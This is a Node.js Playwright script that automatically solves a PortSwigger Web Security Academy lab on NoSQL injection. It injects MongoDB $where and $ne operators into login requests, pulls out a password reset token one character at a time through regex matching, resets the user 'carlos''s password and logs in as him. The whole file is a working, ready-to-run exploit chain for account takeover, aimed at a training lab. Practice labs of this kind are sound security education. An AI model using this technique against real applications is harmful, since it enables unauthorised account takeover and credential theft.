#!/usr/bin/env node
/**
 * Standalone NoSQL #4 solver - extracts password reset token via operator injection
 */
const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields';

const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.-_';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function escapeRegexChar(value) {
  return value.replace(/[\\^$.*+?()[\]{}|']/g, '\\$&');
}

async function extractValue(ctx, labUrl, whereBuilder, maxLength) {
  let value = '';
  for (let i = 0; i < maxLength; i += 1) {
    let found = false;
    for (const ch of CHARS) {
      const clause = whereBuilder(i, ch);
      const r = await ctx.request.post(labUrl + '/login', {
        headers: { 'Content-Type': 'application/json' },
        data: JSON.stringify({
          username: 'carlos',
          password: { $ne: 'invalid' },
          $where: clause,
        }),
      }).catch(() => null);
      if (!r) continue;
      const t = await r.text();
      if (/Account locked|reset your password/i.test(t)) {
        value += ch;
        found = true;
        break;
      }
    }
    if (!found) break;
  }
  return value;
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    // Login to PortSwigger
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    // Navigate to lab page and click ACCESS THE LAB
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const accessBtn = await page.locator('a:has-text("ACCESS THE LAB")').first();
    await accessBtn.click();
    await sleep(30000);
    
    // Find lab URL
    const pages = ctx.pages();
    let labUrl = null;
    for (const p of pages) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) {
        labUrl = u.replace(/\/$/, '');
        break;
      }
    }
    if (!labUrl) throw new Error('Lab URL not found');
    console.log('Lab URL:', labUrl);
    
    // Trigger password reset for carlos
    await ctx.request.post(labUrl + '/forgot-password', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      data: 'username=carlos',
    }).catch(() => null);
    
    // Extract token field name
    console.log('Extracting token field name...');
    const tokenField = await extractValue(
      ctx,
      labUrl,
      (i, ch) => `Object.keys(this)[4].match('^.{${i}}${escapeRegexChar(ch)}.*')`,
      20,
    );
    console.log('Token field:', tokenField);
    if (!tokenField) throw new Error('Token field not found');
    
    // Extract token value
    console.log('Extracting token value...');
    const escapedField = tokenField.replace(/'/g, "\\'");
    const token = await extractValue(
      ctx,
      labUrl,
      (i, ch) => `this['${escapedField}'].match('^.{${i}}${escapeRegexChar(ch)}.*')`,
      40,
    );
    console.log('Token:', token);
    if (!token) throw new Error('Token not found');
    
    // Reset password
    console.log('Resetting carlos password...');
    await ctx.request.post(labUrl + '/forgot-password?' + tokenField + '=' + token, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      data: new URLSearchParams({
        [tokenField]: token,
        'new-password-1': 'password123!',
        'new-password-2': 'password123!',
      }).toString(),
    });
    
    // Login as carlos
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name=username]', 'carlos');
    await page.fill('input[name=password]', 'password123!');
    await page.click('button[type=submit]');
    await sleep(3000);
    
    // Verify
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
